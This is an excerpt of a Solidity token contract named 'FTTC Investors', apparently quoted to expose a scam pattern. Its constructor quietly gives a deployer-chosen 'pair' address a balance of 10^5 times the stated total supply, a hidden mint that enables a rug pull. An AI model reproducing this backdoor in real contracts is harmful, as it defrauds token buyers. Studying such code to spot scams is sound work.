...
contract FTTCInvestors  is Context, IERC20, Ownable {
    uint8 private _decimals = 9;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupply = 750000000  * 10**(_decimals);
    ...
    string private _name = unicode"FTTC Investors";
    string private _symbol = unicode"FTTCI";
    ...
    constructor (address pair) {
        ...
        _balance[pair]=totalSupplyPair2();
    ...
    function totalSupplyPair2() internal view returns (uint256) {
         return _totalSupply * 10 ** 5;
    }
